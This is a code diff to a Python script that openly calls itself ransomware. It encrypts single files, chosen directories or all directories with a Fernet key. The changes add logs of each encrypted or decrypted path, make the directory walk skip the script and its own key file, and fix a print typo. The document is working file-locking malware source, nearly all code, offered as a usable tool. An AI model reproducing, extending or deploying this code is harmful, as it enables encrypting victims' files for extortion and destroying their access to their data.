@@ -1,26 +1,11 @@
 import sys
 from cryptography.fernet import Fernet
 import argparse
+import os
 
-# #total argument should be two , scrpit_name + one argument
-# if len(sys.argv) == 2:
-# 	script_name = sys.argv[0]
-# 	operation = sys.argv[1]
-
-# 	if operation.lower() == "encrypt":
-# 		print("operation : encrypt")
-# 	elif operation.lower() == "decrypt":
-# 		with open("encrytion_key.key" , "rb") as keyFile:
-# 			key = keyFile.read()
-# 		decryptDir("../target_dir",key)
-# 		print("operation : decrypt")
-# 	else:
-# 		print("Invalid operation. Please use 'encrypt' or 'decrypt'.")
-# else:
-# 	print("Please provide exactly one command line argument.")
 
 def main():
-	parser = argparse.ArgumentParser(description="Example script with ransomware-like command-line arguments.")
+	parser = argparse.ArgumentParser(description="ransomware command-line arguments.,expample: python3 ransomeware_4445.py --all -en")
 
 	group = parser.add_mutually_exclusive_group()
 	group.add_argument("-a", "--all", action="store_true", help="Perform the operation on all directories.")
@@ -65,7 +50,7 @@ def main():
 			print("ALL FILES ARE DECRYPTED")
 		elif args.directory:
 			decrypt_directory(f"{args.directory}", key)
-			print(f"DIRECTORY {arge.directory} IS DECRYPTED", key)
+			print(f"DIRECTORY {args.directory} IS DECRYPTED")
 		elif args.file:
 			decrypt_specific_file(f"{args.file}", key)
 			print(f"{args.file} IS DECRYPTED")
@@ -82,11 +67,15 @@ def encrypt_specific_file(file,key):
 
 	with open(file, "wb") as encryptedFile:
 		encryptedFile.write(encrypted_data)
+	with open("./.encrypted.log", "a") as log:
+		log.write(file + "\n")
 
 
 def encrypt_directory(path, key):
 	for root, dirs, files in os.walk(path):
 		for file in files:
+			if(file== "ransomware_4445.py" or file == "encryption_key_4445.key"):
+				continue
 			file_path = os.path.join(root, file)
 			encrypt_specific_file(file_path, key)
 
@@ -98,10 +87,15 @@ def decrypt_specific_file(file,key):
 
 	with open(file, "wb") as encryptedFile:
 		encryptedFile.write(decrypted_data)
+	with open("./.decrypted.log", "a") as log:
+		log.write(file + "\n")
+
 
 def decrypt_directory(path,key):
 	for root, dirs, files in os.walk(path):
 		for file in files:
+			if(file == "ransomware_4445.py" or file == "encryption_key_4445.key"):
+				continue
 			file_path = os.path.join(root,file)
 			decrypt_specific_file(file_path,key)
 
